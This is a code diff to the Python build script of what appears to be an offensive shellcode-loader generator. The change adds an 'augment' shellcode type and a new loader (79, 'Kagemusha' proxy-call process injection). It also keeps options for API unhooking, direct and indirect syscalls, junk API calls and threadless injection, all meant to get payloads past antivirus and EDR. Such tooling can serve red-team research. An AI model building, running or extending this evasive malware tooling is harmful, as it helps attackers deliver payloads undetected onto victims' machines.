@@ -24,6 +24,18 @@ def in_docker():
     return os.path.exists('/.dockerenv') or \
            'docker' in open('/proc/1/cgroup', 'rt').read()
 
+# def in_docker():
+#     """Detect if running inside a Docker container."""
+#     if os.path.exists('/.dockerenv'):
+#         return True
+
+#     try:
+#         with open('/proc/1/cgroup', 'rt', encoding='utf-8') as f:
+#             return 'docker' in f.read()
+#     except Exception:
+#         return False
+
+
 def run_cmd(cmd_list, **kwargs):
     """Run a command, stripping sudo if inside Docker."""
     if in_docker() and cmd_list[0] == 'sudo':
@@ -97,7 +109,7 @@ def handle_star_dust(input_file):
     # subprocess.run(['cp', 'Stardust/src/Main.c.bak', 'Stardust/src/Main.c'], check=True)
 
 
-
+# TODO: 
 def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, encoding=None, star_dust=False):
     if not star_dust:
         # Generate the initial shellcode .bin file
@@ -117,9 +129,27 @@ def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, enc
             cmd = ['./PIC/amber', '-e', str(a_number), '--iat', '--scrape', '-f', input_exe, '-o', output_path + ".bin"]
         elif shellcode_type == 'shoggoth':
             cmd = ['wine', './PIC/shoggoth.exe', '-v', '-i', input_exe, '-o', output_path + ".bin", '--mode', 'pe']
+        ####
+        elif shellcode_type == 'augment':
+            # 1) Dump the in-memory layout from the PE (PIC-friendly base) to a temp file
+            import os
+            temp_output = output_path + ".infl.tmp"
+            cmd1 = ['wine', './PIC/DumpPEFromMemory.exe', input_exe, temp_output]
+            r1 = subprocess.run(cmd1)
+            if r1.returncode != 0:
+                raise RuntimeError(f"[-] DumpPEFromMemory failed with rc={r1.returncode}")
 
+            # 2) Generate shellcode from the dumped image using augmentedLoader.py
+            final_output = output_path + ".bin"
+            cmd = ['python3', './PIC/augmentedLoader.py',
+                    '-f', temp_output,
+                    '-e', 'false',
+                    '-o', 'true',
+                    '-b', final_output]
+
+            #
         else:
-            raise ValueError("Unsupported shellcode type.")
+            raise ValueError("[-] Unsupported shellcode type.")
 
         # Run the initial shellcode generation command
         # subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -127,6 +157,12 @@ def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, enc
         subprocess.run(cmd, check=True)
         # print the shellcode type used:
         print(f"[+] Shellcode type used: {shellcode_type}")
+        # if shellcode_type == 'augment':
+        #     # # cleanup temp
+        #     try:
+        #         os.remove(temp_output)
+        #     except OSError:
+        #         pass
     
     elif star_dust:
         output_path = input_exe
@@ -710,7 +746,7 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
     content = insert_junk_api_calls(content, junk_api, main_func_pattern)
 
     # Replace the placeholder with the actual shellcode
-    if (encoding == None):
+    if (encoding is None):
         content = content.replace('####SHELLCODE####', shellcode)
 
 
@@ -856,6 +892,13 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         except subprocess.CalledProcessError as e:
             print(f"[-] NASM assembly compilation failed: {e}")
             return  # Exit the function if NASM compilation fails
+    if loader_number in [79]: 
+        try:
+            subprocess.run(['nasm', '-f', 'win64', 'allocate.asm', '-o', 'assembly.o'], check=True)
+            print("[+] NASM assembly compilation successful.")
+        except subprocess.CalledProcessError as e:
+            print(f"[-] NASM assembly compilation failed: {e}")
+            return  # Exit the function if NASM compilation fails
     if loader_number in [29, 30, 34, 36]:
         asm_file = 'direct_syscall.asm' if loader_number == 30 else 'edr_syscall_1.asm' if loader_number == 34 else 'edr_syscall_2.asm' if loader_number == 36 else 'indirect_syscall.asm'
         try:
@@ -993,11 +1036,11 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
     if loader_number == 33: 
         compile_command.append('./syscall.c')
         compile_command.append('assembly.o')
-    if loader_number in [1, 29, 30, 34, 36, 39, 40, 41, 50, 66]:
+    if loader_number in [1, 29, 30, 34, 36, 39, 40, 41, 50, 66, 79]:
 
         compile_command.append('assembly.o')
         compile_command.append('-luuid')
-    if loader_number in [37, 38, 48, 49, 50, 51, 52, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 76, 77]:
+    if loader_number in [37, 38, 48, 49, 50, 51, 52, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 76, 77, 79]:
         compile_command.append('./evader/pebutils.c')
         # compile_command.append('-lole32')
     # if loader_number == 50:  // for pretext code
@@ -1338,6 +1381,7 @@ def main():
     75. Dotnet JIT threadless process injection. 
     76. Module List PEB Entrypoint threadless process injection. 
     77. VT Pointer threadless process injection. Use RtlCreateHeap instead of BaseThreadInitThunk virtual table pointer.
+    79. Proxy function call stub 2 step process injection: Kagemusha PI. Only CreateThread is called without explicitly call to Write primitive. 
 
      """
 
@@ -1384,7 +1428,7 @@ def main():
     parser.add_argument('-u', '--api-unhooking', action='store_true', help='Enable API unhooking functionality')
     parser.add_argument('-g', '--god-speed', action='store_true', help='Enable advanced unhooking technique Peruns Fart (God Speed)')
 
-    parser.add_argument('-t', '--shellcode-type', default='donut', choices=['donut', 'pe2sh', 'rc4', 'amber', 'shoggoth'], help='Shellcode generation tool: donut (default), pe2sh, rc4, amber or shoggoth')
+    parser.add_argument('-t', '--shellcode-type', default='donut', choices=['donut', 'pe2sh', 'rc4', 'amber', 'shoggoth', 'augment'], help='Shellcode generation tool: donut (default), pe2sh, rc4, amber, shoggoth or augmented loader')
     parser.add_argument('-sd', '--star_dust', action='store_true', help='Enable Stardust PIC generator, input should be .bin')
 
 
@@ -1472,6 +1516,8 @@ def main():
         shellcode_file = 'note_amber'
     elif args.shellcode_type == 'shoggoth':
         shellcode_file = 'note_shoggoth'
+    elif args.shellcode_type == 'augment':
+        shellcode_file = 'note_augment'
     else:
         # Default case, though this should never be hit due to argparse choices constraint
         shellcode_file = 'note_donut'
